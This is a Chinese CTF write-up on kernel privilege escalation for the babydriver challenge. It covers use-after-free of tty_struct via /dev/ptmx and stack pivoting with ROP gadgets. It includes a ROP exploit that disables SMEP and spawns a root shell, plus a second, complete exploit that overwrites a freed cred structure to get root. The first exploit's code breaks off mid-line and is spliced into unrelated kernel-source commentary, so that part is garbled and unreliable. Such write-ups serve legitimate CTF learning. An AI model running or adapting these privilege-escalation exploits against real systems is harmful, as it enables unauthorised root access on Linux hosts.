接下来考虑如何通过 UAF 劫持程序执行流，这里我们选择 `tty_struct` 结构体作为 victim object。
在 ```/dev``` 下有一个伪终端设备 ```ptmx``` ，在我们打开这个设备时内核中会创建一个 ```tty_struct``` 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 ``` tty_operations ```。
那么我们不难想到的是我们可以通过 UAF 劫持 ```/dev/ptmx``` 这个设备的 ```tty_struct``` 结构体与其内部的 ```tty_operations``` 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针。
由于没有开启SMAP保护，故我们可以在用户态进程的栈上布置ROP链与 ```fake tty_operations``` 结构体。
> 结构体 ```tty_struct```位于```include/linux/tty.h``` 中，```tty_operations``` 位于 ```include/linux/tty_driver.h``` 中。
内核中没有类似 ```one_gadget``` 一类的东西，因此为了完成ROP我们还需要进行一次**栈迁移**
使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 ```tty_operaionts``` 结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数指针以方便下断点：
我们不难观察到，在我们调用```tty_operations->write```时，**其rax寄存器中存放的便是tty\_operations结构体的地址**，因此若是我们能够在内核中找到形如```mov rsp, rax```的gadget，便能够成功地将栈迁移到```tty_operations```结构体的开头。
使用ROPgadget查找相关gadget，发现有两条符合我们要求的gadget：
gdb调试，发现第一条gadget其实等价于```mov rsp, rax ; dec ebx ; ret```：
那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链。
而```tty_operations```结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可：
### Exploit
```c
#include 
#include 
#include 
#include 
#include 
#include 
#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef
size_t commit_creds = NULL, prepare_kernel_cred = NULL;
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}
void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}
int main(void)
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();
    //get the addr
    FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd  来自内核源码 4.5 `kernel/cred.c`
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
> 			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
> }
> ```
>
> 本题（4.4.72）：
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
> 				     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
> }
> ```
因此这里考虑介绍更加通用的解法，对旧的解法感兴趣的可以参考如下exp：
```c
#include 
#include 
#include 
#include 
#include 
#include 
int main(void)
{
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    ioctl(fd1, 0x10001, 0xa8); /* object to be reused as the child's cred */
    close(fd1);
    int pid = fork();
    if(pid < 0) {
        printf("\033[31m\033[1m[x] Unable to fork.\033[0m\n");
        return -1;
    }
    else if(pid == 0) { /* the child to get the UAF cred */
        char buf[30];
        memset(buf, '\0', sizeof(buf));
        write(fd2, buf, 28);  /* overwrite uid&gid to 0 directly */
        if(getuid() == 0) {
            puts("\033[32m\033[1m[+] Successful to get the root.\033[0m\n");
            system("/bin/sh");
            return 0;
        } else {
            printf("\033[31m\033[1m[x] Failed to get the root.\033[0m\n");
            return -1;
        }
    }
    else { /* the parent */
        wait(NULL); /* waiting for the child to be done */
    }
    return 0;
}
```
## Reference
https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free
https://bbs.pediy.com/thread-247054.htm
https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html
http://muhe.live/2017/07/13/babydriver-writeup/
https://www.anquanke.com/post/id/86490